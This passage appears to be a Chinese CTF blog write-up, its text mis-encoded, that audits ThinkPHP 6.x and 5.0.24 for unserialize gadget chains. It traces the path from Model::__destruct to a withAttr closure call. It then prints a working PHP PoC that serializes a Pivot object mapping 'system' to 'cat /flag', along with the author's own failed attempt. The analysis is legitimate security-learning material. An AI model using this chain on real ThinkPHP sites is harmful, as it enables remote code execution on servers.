class="line">            <span class="keyword">if</span> (method_exists(<span class="built_in">static</span>::class, <span class="variable">$call</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = call_user_func([<span class="built_in">static</span>::class, <span class="variable">$call</span>], <span class="keyword">$this</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_object(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; method_exists(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;trigger(<span class="built_in">static</span>::class . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="keyword">$this</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : end(<span class="variable">$result</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæˆ‘è§‰å¾—<code>call_user_func([static::class, $call], $this)</code>è¿™æ®µä»£ç æœ‰ç‚¹å¯ç–‘ï¼Œä½†æ˜¯ç”±äºå¯¹phpä¸€äº›è¯­æ³•è¿˜æ˜¯ä¸æ˜¯å¾ˆç†è§£ï¼Œæ¯”å¦‚å¯¹è¿™ä¸ªå‡½æ•°é‡Œé¢çš„<code>[static::class, $call], $this</code>å°±ä¸æ˜¯å¾ˆç†è§£ï¼Œç„¶åè¿™é‡Œçš„<code>$call</code>åœ¨å‰é¢åˆä¼šæœ‰å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯åˆ©ç”¨ä¸äº†çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥å»æ‰¾<code>toString</code>æ–¹æ³•å§</p>
<p>3.æ‰¾å¯åˆ©ç”¨çš„<code>__toString</code></p>
<p>å…¨å±€æœç´¢<code>toString</code>æ–¹æ³•ï¼Œå¯ä»¥åœ¨<code>Collection.php</code>å’Œ<code>Conversion.php</code>ä¸­é‡åˆ°å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯åœ¨<code>Collection</code>ä¸­ï¼Œå‡½æ•°åœ¨è¿›è¡Œåˆ°<code>toArray</code>ä¹‹åå°±åœæ­¢äº†ï¼Œå¹¶æ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼Œé‚£æˆ‘ä»¬æ¥åˆ†æ<code>Conversion.php</code></p>
<p><code>__toString</code>ï¼Œè·Ÿè¸ª<code>toJson</code>æ–¹æ³•ï¼Œæ˜¯å¯¹æ•°æ®è¿›è¡ŒjsonåŠ å¯†ï¼Œè·Ÿè¸ª<code>toArray</code></p>
<p><img src="http://82.156.2.166/img/iamthinking/toString.png"></p>
<p><code>Conversion/toArray</code>ï¼Œå‰åŠæ®µéƒ½ä¸ä¼šå½±å“ä»€ä¹ˆï¼Œç›´æ¥è·Ÿè¸ª<code>appendAttrToArray</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       â€¦â€¦</span><br><span class="line">       â€¦â€¦</span><br><span class="line">       â€¦â€¦</span><br><span class="line">       <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;appendAttrToArray(<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment"># ä¼ å…¥item ä»¥åŠappendä¸­çš„é”® å€¼</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Conversion/appendAttrToArray</code>ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">appendAttrToArray</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">           <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">           <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">           <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">           <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])</span><br><span class="line">               -&gt;toArray() : [];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$value</span>       = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>); <span class="comment"># å°†å€¼ä¼ è¿›å»</span></span><br><span class="line">           <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;getBindAttr(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$item</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getAttr</code>ï¼Œè·Ÿè¸ªgetDataï¼Œå¤§æ¦‚ä¼šè¿”å›<code>$this-&gt;data[$name]</code>ï¼Œç›´æ¥è·Ÿè¸ªgetValue</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">           <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>); <span class="comment"># è¿”å›$this-&gt;data[$name]</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">           <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;isRelationAttr(<span class="variable">$name</span>);</span><br><span class="line">           <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment"># $name = $name $value = $this-&gt;data[$name] $relation = false</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getData</code>,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>); </span><br><span class="line">    	<span class="comment"># ä½¿å¾— $fieldName = $name</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="comment"># å¦‚æœé”®å­˜åœ¨åˆ™è¿”å›å€¼</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getRealFieldName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? <span class="variable">$name</span> : Str::snake(<span class="variable">$name</span>);</span><br><span class="line">    	<span class="comment"># ç›´æ¥è¿”å›name </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getValue</code>ï¼Œå¯ä»¥å‘ç°å¦‚æœ<code>$this-&gt;withAttr[$fieldName]</code>ä¸æ˜¯æ•°ç»„çš„è¯ï¼Œå°±ç›´æ¥è¿›å…¥<code>$closure($value, $this-&gt;data);</code>ï¼Œçœ‹æ³¨é‡Šæ‰çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥æ„è¯†åˆ°è¿™é‡Œå°±æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç çš„åœ°æ–¹äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">       <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>);</span><br><span class="line">       <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . Str::studly(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getRelationValue(<span class="variable">$relation</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (in_array(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getJsonValue(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">//$fieldName = a</span></span><br><span class="line">               <span class="comment">//withAttr[a] = system</span></span><br><span class="line">               <span class="variable">$closure</span> = <span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">               <span class="comment">//value = system(ls,)</span></span><br><span class="line">               <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">           â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>æ€è·¯æ€»ç»“1ï¼š</p>
<blockquote>
<ol>
<li>å…ˆè§¦å‘Modelç±»çš„__destructæ–¹æ³•ï¼Œä½¿å¾—$this-&gt;lazySaveä¸ºtrueè¿›å…¥saveå‡½æ•°</li>
<li>è¦æ±‚<code>$this-&gt;withEventä¸ºfalse</code>ï¼Œ$this-&gt;dataä¸ä¸ºç©ºï¼Œ$this-&gt;exitsä¸ºtrueï¼Œè¿›å…¥updateDataå‡½æ•°</li>
<li>ç›´æ¥è¿›å…¥Attributeç±»çš„getChangedDataå‡½æ•°ï¼Œä¼šå› ä¸ºä¹‹åè¦å»checkï¼Œæ‰€ä»¥ä¸èƒ½åœ¨ä¸‹ä¸€ä¸ªifè¯­å¥é‡Œreturnæ‰ï¼Œæ‰€ä»¥è¿”å›çš„$dataä¸èƒ½ä¸ºç©ºï¼Œæ‰€ä»¥è¦æ±‚Attributeé‡Œé¢çš„$this-&gt;forceä¸ºtrueï¼Œ$this-&gt;dataè¦æœ‰å€¼ï¼Œè¿›å…¥Modelï¼ŒcheckAllowFieldså‡½æ•°</li>
<li>è¿›å…¥ifï¼Œè¦æ±‚$this-&gt;fieldå’Œ$this-&gt;schemaéƒ½ä¸ºç©ºï¼Œåœ¨è¿™é‡Œ$this-&gt;table . $this-&gt;suffixè§¦å‘Conversionç±»çš„toStringæ–¹æ³•ï¼Œæ‰€ä»¥è¦æ±‚$this-&gt;tableä¸ºtrueï¼Œ$this-&gt;suffixå®ä¾‹åŒ–Conversion</li>
<li>è¿›å…¥Conversionç±»ï¼Œè¿›å…¥toArrayå‡½æ•°ï¼Œè¿›å…¥Attributeç±»çš„getAttrå‡½æ•°ï¼Œä¼ é”®å€¼ï¼Œè¿›å…¥getDataå‡½æ•°ï¼Œä¼ å…¥çš„å€¼ä¸èƒ½ä¸ºç©ºï¼Œè¿›å…¥getRealFieldNameå‡½æ•°ï¼Œè¦æ±‚$this-&gt;strictä¸ºtrueï¼Œä½¿å¾—ç›´æ¥è¿”å›$nameï¼Œç„¶åè¦åœ¨é”®å€¼è¦å­˜åœ¨äº$this-&gt;dataä¸­ï¼Œä½¿å¾—ç›´æ¥è¿”å›$this-&gt;data[$name]ï¼Œæœ€åä»¥$name=$key $value=$this-&gt;data[$name] $relation=falseè¿›å…¥getValueå‡½æ•°</li>
<li>è¿›å…¥ifï¼Œè¦æ±‚$this-&gt;withAttr[$name]æœ‰å€¼å¹¶ä¸”ä¸æ˜¯æ•°ç»„ï¼Œè¿›å…¥$closure = $this-&gt;withAttr[$fieldName];$closure($value, $this-&gt;data);è¿›è¡Œä»£ç æ‰§è¡Œ</li>
</ol>
</blockquote>
<p>æ€»ç»“2ï¼š</p>
<blockquote>
<p>Model: $this-&gt;lazySave = true;    $this-&gt;withEvent = false;    $this-&gt;exits = true;    $this-&gt;data = [];    $this-&gt;table = true;    $this-&gt;suffix = new Conversion();    $this-&gt;field = [];    $this-&gt;schema = [];</p>
<p>Attribute: $this-&gt;force = true;    $this-&gt;data = [$name=&gt;â€™cat /flagâ€™];    $this-&gt;strict = true;    $this-&gt;withAttr = [$name=&gt;â€™systemâ€™];    </p>
</blockquote>
<p>poc:ï¼ˆç½‘ä¸Šçš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;hu3sky&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">&quot;hu3sky&quot;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(&#x27;&#x27;);</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> think\model\Pivot(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pocï¼šï¼ˆæˆ‘è‡ªå·±å†™çš„ å‡ºé”™äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">force</span> = <span class="title">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;strict = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span> <span class="title">as</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span> <span class="title">as</span> <span class="title">ConcernConversion</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernConversion</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exits = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;1&quot;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = <span class="keyword">new</span> ConcernConversion();	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Model</span>();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åç”Ÿæˆçš„payloadï¼Œæ³¨æ„è¿™é‡Œå­˜åœ¨<code>parse_url</code>è§£ææ¼æ´ï¼Œåƒä¹‹å‰ä¸€æ ·ç»•è¿‡å°±å¥½äº†</p>
<p><strong>åè®°ï¼š</strong></p>
<p>æ€»çš„æ¥è¯´ï¼Œè¿˜æ˜¯å¯¹thinkphpæ¡†æ¶ä¸å¤Ÿç†è§£ï¼Œå¯¹namespaceå’Œuseå…³é”®å­—çš„è¿ç”¨ç†è§£ä¸èƒ½</p>
<p>è¿™ä¸¤å¤©é™¤äº†è¿™é“é¢˜ï¼Œå‚åŠ çš„æ¯”èµ›ä¹Ÿéƒ½è¦å®¡è®¡å¤§é‡çš„ä»£ç ï¼Œæ„Ÿè§‰å¤´æ˜è„‘èƒ€çš„ï¼ˆæ‚²</p>
<p>ä»£ç ä¸€çœ‹å¾—å¤šäº†ï¼Œå†åŠ ä¸Šæœ‰äº›ä»£ç è¿˜æ˜¯ä¸èƒ½ç†è§£é€ï¼Œæ‰€ä»¥è¿‡ç¨‹ä¸­æ€ç»ªå°±ä¼šæœ‰ç‚¹ä¹±</p>
<p>å†åŠªåŠ›å§</p>
<h2 id="Thinkphp5-0-24ååºåˆ—åŒ–"><a href="#Thinkphp5-0-24ååºåˆ—åŒ–" class="headerlink" title="Thinkphp5.0.24ååºåˆ—åŒ–"></a>Thinkphp5.0.24ååºåˆ—åŒ–</h2><p><a href="http://www.thinkphp.cn/donate/download/id/1279.html">Thinkphp5.0.24</a></p>
<p><strong>0x01:</strong></p>
<p>å› ä¸ºå·²ç»çŸ¥é“æ˜¯ååºåˆ—åŒ–æ¼æ´äº†ï¼Œæ‰€ä»¥ç›´æ¥å®¡è®¡ä»£ç å§ã€‚ä¸€èˆ¬å¸¸ç”¨çš„é­”æœ¯æ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct</span><br><span class="line">__destruct</span><br><span class="line">__toString</span><br><span class="line">__wakeup</span><br><span class="line">__get</span><br><span class="line">__invoke</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆè‡ªè¡Œå…¨å±€æœç´¢ä¸€ä¸‹å¯ç”¨çš„é­”æœ¯æ–¹æ³•</p>
<p>1.<code>__destruct</code></p>
<p>ä¸€å…±æœåˆ°å››ä¸ªï¼Œæš‚æ—¶å‘ç°å¯åˆ©ç”¨çš„æœ‰ä¸€ä¸ª<code>Windows.php</code>é‡Œé¢çš„å­˜åœ¨å¯è§¦å‘<code>toString</code>çš„ç‚¹ï¼Œé‚£å°±å…ˆç›´æ¥ä»è¿™é‡Œå¼€å§‹</p>
<p>é¦–å…ˆæ˜¯<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;close(); <span class="comment"># å…³é—­æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;removeFiles(); <span class="comment"># åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># removeFiles</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123; <span class="comment"># å¯ä»¥è§¦å‘toString</span></span><br><span class="line">                @unlink(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/de2f1ec402c146c19e084561c3289b84.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£ä¹‹åå¯ä»¥å»æ‰¾ä¸€ä¸‹<code>toString</code>æ–¹æ³•</p>
<p>2.<code>__toString</code></p>
<p>å› ä¸ºå‰é¢å®¡è®¡äº†6.xçš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥å†æ‰¾åˆ°Modelç±»çš„æ—¶å€™å°±ç›´æ¥çœ‹äº†ï¼Œç»§ç»­è·Ÿè¸ªå‡½æ•°</p>
<p><code>toArray</code></p>
